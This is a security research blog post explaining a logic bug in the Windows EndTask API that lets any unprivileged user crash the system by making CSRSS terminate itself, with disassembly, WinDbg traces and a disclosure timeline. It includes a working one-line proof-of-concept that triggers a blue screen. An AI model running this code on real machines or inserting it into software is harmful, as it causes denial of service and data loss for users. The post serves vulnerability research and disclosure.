date: 2020-03-09 00:00:00
modified: 2020-03-09 00:00:00
title: An unexpected logic bug on Win32k
author: hugsy
category: research
tags: windows,kernel,logic,bug,win32k
cover: assets/images/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png

## The short version

The short version is that there's a small logic bug in  `user32!EndTask()` which doesn't really check the `HWND` handle passed when forcefully killing the process, allowing unprivileged process to BSoD the host by killing the critical process `csrss`. And as a bonus the PoC code #FitsInATweet:

```c
int WinMain(HINSTANCE h, HINSTANCE ins, LPSTR cmd, int nb)
{
    EndTask(GetDesktopWindow(), 0, 1);
    return 0;
}
```

Just compile, run (here on a build 19569.1000 x64) and enjoy:

![bsod](https://i.imgur.com/DRxULeh.png)


## The less short version

Reversing `Win32k.sys` driver has been my hobby lately mostly to understand it (finally) seriously - if there is such a thing. This is a really small funny logic bug I encountered while reversing it, which I don't feel too bad disclosing since there is [no security exploitability](https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria){:target="_blank"} (simply annoying your sysadmin).


### The juicy part

The legacy function [EndTask](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-endtask){:target="_blank"} can be used to forcefully close the specific window whose handle is passed as argument, and free all associated resources. Although deprecated according to the MSDN, it is still callable even on the latest Windows versions.

The function `user32!EndTask()` is merely a wrapper designed to forward some specific messages to the [CSRSS](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem){:target="_blank"} via an ALPC, using the exported function
`ntdll!CsrClientCallServer` with the ApiNumber 0x30401. Easily enough, the function takes the handle to the window to shut down. The function operates with the thread's token, and is unprivileged. Starting playing around, I remembered that `GetDesktopWindow()` will return a valid handle to the desktop window, but has [many interesting properties](https://devblogs.microsoft.com/oldnewthing/20040224-00/?p=40493){:target="_blank"} including that that it is owned by `csrss.exe`. That can be quickly demonstrated using the following code:

```c
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char msg[1024]={0,};
    HWND hwnd = GetDesktopWindow();
    DWORD dwProcessId;
    GetWindowThreadProcessId(hwnd, &dwProcessId);
    sprintf(msg, "hwnd=%p pid=%lu\n", hwnd, dwProcessId);
    MessageBoxA(0,msg,0,MB_OK);
    return 0;
}
```
which will output the PID of CSRSS

![finding_csrss](https://i.imgur.com/Q4XsJZP.png)


In turn, CSRSS will consume that message and call `winsrvext!SrvEndTask()` then `winsrvext!EndTask()`. In this function, in order to determine the process to terminate `csrss` will invoke `GetWindowThreadProcessId()` and will use the found process id value to look into the [`CSR_PROCESS`](http://www.geoffchappell.com/studies/windows/win32/csrsrv/api/process/process.htm){:target="_blank"} linked
list (via `csrsrv!CsrRootProcess`), and find the `CSR_PROCESS` structure associated to such PID. From `winsrvext.dll`:

```asm
_EndTask      ; NTSTATUS __fastcall EndTask(HWND hWnd, int a2)
_EndTask      _EndTask        proc near               ; CODE XREF: SrvEndTask+119↓p
_EndTask                                              ; DATA XREF: .pdata:000000000001D21C↓o
[...]
_EndTask+A7                   lea     rdx, [rsp+120h+dwProcessId] ; lpdwProcessId
_EndTask+AC                   mov     rcx, rdi        ; hWnd
_EndTask+AF                   call    cs:__imp_GetWindowThreadProcessId
```

### The bug

And therein lied the bug: as shown above with the small C snippet, the owner of `GetDesktopWindow()` is `csrss` itself, therefore the lookup will return the `CSR_PROCESS` structure of `CSRSS` (which happens to be the first entry in the `CsrRootProcess` linked list). Finally, `winsrvext!EndTask()` will proceed to call `ntdll!NtTerminateProcess()` passing the handle to the
process `CSRSS`, which has the value `(HANDLE)-1` (i.e. `GetCurrentProcess()`). WinDbg can be used to confirm that behavior:

```
0: kd> dps poi( csrsrv!CsrRootProcess )
00000218`7d004550  00000000`00000c14 <- CSR_PROCESS.ClientId
00000218`7d004558  00000000`00000c18
00000218`7d004560  00000218`7d008bf0 <- CSR_PROCESS.LinkList
00000218`7d004568  00000218`7d04b3a0 <- CSR_PROCESS.ThreadList
00000218`7d004570  00000218`7d005368 [...]
00000218`7d004578  00000218`7d0486b8
00000218`7d004580  00000000`00000000
00000218`7d004588  00000000`00000000
00000218`7d004590  00000000`00000000
00000218`7d004598  00000000`00000000
00000218`7d0045a0  ffffffff`ffffffff <<- CSR_PROCESS.ProcessHandle (i.e. value passed to NtTerminateProcess)
00000218`7d0045a8  00000040`00000005
[...]
```

Therefore, this will make `CSRSS` killing itself when invoking calling the syscall `nt!NtTerminateProcess(GetCurrentProcess(), 0 )`. As a critical process, killing CSRSS will immediately result in a BSoD, which BugCheck clearly shows. Also note that this crash can be triggered by any user even with any privilege. In WinDbg the faulting stack trace of our BSoD retraces exactly everything we show:

```
CRITICAL_PROCESS_DIED (ef)
        A critical system process died
[...]
Arguments:
Arg1: ffffe30f47ce14c0, Process object or thread object
Arg2: 0000000000000000, If this is 0, a process died. If this is 1, a thread died.
[...]

STACK_TEXT:
ffff8803`2a71f280 fffff801`795c75c1 : [...] : nt!PspCatchCriticalBreak+0xa9
ffff8803`2a71f320 fffff801`79439fc0 : [...] : nt!PspTerminateAllThreads+0x175e3d
ffff8803`2a71f390 fffff801`79439da9 : [...] : nt!PspTerminateProcess+0xe0
ffff8803`2a71f3d0 fffff801`78fd2d15 : [...] : nt!NtTerminateProcess+0xa9
ffff8803`2a71f440 00007ff9`83b5c644 : [...] : nt!KiSystemServiceCopyEnd+0x25
000000b6`d35befd8 00007ff9`809066e5 : [...] : ntdll!NtTerminateProcess+0x14
000000b6`d35befe0 00007ff9`80906bae : [...] : winsrvext!EndTask+0x235
000000b6`d35bf110 00007ff9`80975af4 : [...] : winsrvext!SrvEndTask+0x11e
000000b6`d35bf380 00007ff9`83b2cedf : [...] : CSRSRV!CsrApiRequestThread+0x484
000000b6`d35bf810 00000000`00000000 : [...] : ntdll!RtlUserThreadStart+0x2f
```

## Final words

This was a good lesson, mostly because I would never have thought finding a (cheap) logic bug in an API that is around for decades and probably gleaned at many times by people way smarter.

Also, I've reported more Win32k bugs to MS which I'll be writing up on soon.

That's all for this quick post!

✌

## Disclosure timeline

  * 2019-12-09 : Bug found
  * 2020-02-08 : Finally found some time to do some analysis
  * 2020-02-09 : Issue submitted to MSRC (case 56511)
  * 2020-03-04 : EWONTFIX
